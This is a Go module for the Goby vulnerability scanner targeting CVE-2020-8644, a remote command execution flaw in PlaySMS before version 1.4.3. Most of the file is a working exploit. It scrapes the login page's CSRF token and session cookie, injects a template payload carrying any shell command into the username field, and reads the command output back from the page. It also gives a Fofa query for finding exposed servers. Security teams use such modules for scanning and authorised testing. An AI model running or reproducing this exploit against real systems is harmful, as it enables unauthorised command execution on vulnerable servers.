package exploits

import (
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "playSMS login username parameter remote command execution vulnerability (CVE-2020-8644)",
    "Description": "<p>PlaySMS is a web-based SMS platform. The platform supports connecting to SMS gateways, personal information systems, and enterprise group communication tools.</p><p>Prior to version 1.4.3, PlaySMS had an input validation error vulnerability due to the program failing to sanitize malicious strings. Attackers could exploit this vulnerability to execute arbitrary code.</p>",
    "Product": "PlaySMS",
    "Homepage": "https://github.com/playsms/playsms",
    "DisclosureDate": "2020-02-18",
    "Author": "14m3ta7k",
    "FofaQuery": "body=\"/plugin/themes/common/jscss/common.js\"",
    "GobyQuery": "body=\"/plugin/themes/common/jscss/common.js\"",
    "Level": "3",
    "Impact": "<p>Prior to version 1.4.3, PlaySMS had an input validation error vulnerability due to the program failing to sanitize malicious strings. Attackers could exploit this vulnerability to execute arbitrary code.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch: <a href=\"https://forum.playsms.org/t/playsms-1-4-3-has-been-released/2704\">https://forum.playsms.org/t/playsms-1-4-3-has-been-released/2704</a></p>",
    "References": [
        "https://github.com/projectdiscovery/nuclei-templates/pull/4753/files"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2020-8644"
    ],
    "CNNVD": [
        "CNNVD-202002-145"
    ],
    "CNVD": [
        "CNVD-2020-10450"
    ],
    "CVSSScore": "9.5",
    "Translation": {
        "CN": {
            "Name": "playSMS login username 参数远程命令执行漏洞（CVE-2020-8644）",
            "Product": "PlaySMS",
            "Description": "<p>PlaySMS 是一套基于Web的短信平台。该平台支持连接短信网关、个人信息系统以及企业的群组通讯工具等。</p><p>PlaySMS 1.4.3之前版本中存在输入验证错误漏洞，该漏洞源于程序没有清理恶意的字符串。攻击者可利用该漏洞执行任意代码。</p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：<a href=\"https://forum.playsms.org/t/playsms-1-4-3-has-been-released/2704\">https://forum.playsms.org/t/playsms-1-4-3-has-been-released/2704</a></p>",
            "Impact": "<p>PlaySMS 1.4.3之前版本中存在输入验证错误漏洞，该漏洞源于程序没有清理恶意的字符串。攻击者可利用该漏洞执行任意代码。</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "playSMS login username parameter remote command execution vulnerability (CVE-2020-8644)",
            "Product": "PlaySMS",
            "Description": "<p>PlaySMS is a web-based SMS platform. The platform supports connecting to SMS gateways, personal information systems, and enterprise group communication tools.</p><p>Prior to version 1.4.3, PlaySMS had an input validation error vulnerability due to the program failing to sanitize malicious strings. Attackers could exploit this vulnerability to execute arbitrary code.</p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch: <a href=\"https://forum.playsms.org/t/playsms-1-4-3-has-been-released/2704\">https://forum.playsms.org/t/playsms-1-4-3-has-been-released/2704</a></p>",
            "Impact": "<p>Prior to version 1.4.3, PlaySMS had an input validation error vulnerability due to the program failing to sanitize malicious strings. Attackers could exploit this vulnerability to execute arbitrary code.</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10692"
}`

	sendPayloadFlagyWq8Vv := func(u *httpclient.FixUrl, cmd string) (string, error) {
		cfg := httpclient.NewGetRequestConfig("/index.php?app=main&inc=core_auth&route=login")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		response, err := httpclient.DoHttpRequest(u, cfg)
		if err != nil {
			return "", err
		}
		if !strings.Contains(response.Utf8Html, "X-CSRF-Token") {
			return "", errors.New("漏洞不存在")
		}
		// 提取 CSRF Token
		csrfMatchResult := regexp.MustCompile("<input type=\"hidden\" name=\"X-CSRF-Token\" value=\"(.*?)\">").FindStringSubmatch(response.Utf8Html)
		if len(csrfMatchResult) < 2 {
			return "", errors.New("漏洞检测失败")
		}
		// 提取 PHPSESSID
		phpsessid := ""
		for _, cookie := range response.Cookies() {
			if cookie.Name == "PHPSESSID" {
				phpsessid = cookie.Value
				break
			}
		}
		if phpsessid == "" {
			return "", errors.New("漏洞检测失败")
		}
		cfg = httpclient.NewPostRequestConfig("/index.php?app=main&inc=core_auth&route=login&op=login")
		cfg.VerifyTls = false
		cfg.FollowRedirect = true
		cfg.Header.Store("Origin", u.FixedHostInfo)
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		cfg.Header.Store("Cookie", "PHPSESSID="+phpsessid)
		cfg.Data = `X-CSRF-Token=` + csrfMatchResult[1] + fmt.Sprintf(`&username=%%7B%%7B%%60%s%%60%%7D%%7D&password=`, url.QueryEscape(cmd))
		response, err = httpclient.DoHttpRequest(u, cfg)
		if err != nil {
			return "", err
		}
		matchResult := regexp.MustCompile(`name=username value=["']([\s\S]*?)["'] maxlength=`).FindStringSubmatch(response.Utf8Html)
		if len(matchResult) < 2 {
			return "", errors.New("漏洞不存在")
		}
		return matchResult[1], nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randomStr := goutils.RandomHexString(8)
			cmd := "echo " + randomStr
			response, err := sendPayloadFlagyWq8Vv(u, cmd)
			if err != nil {
				return false
			}
			// 匹配输出结果，并且不包含 echo
			return strings.Contains(response, randomStr) && !strings.Contains(response, "echo")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			response, err := sendPayloadFlagyWq8Vv(expResult.HostInfo, cmd)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
			} else {
				expResult.Success = true
				expResult.Output = response
			}
			return expResult
		},
	))
}
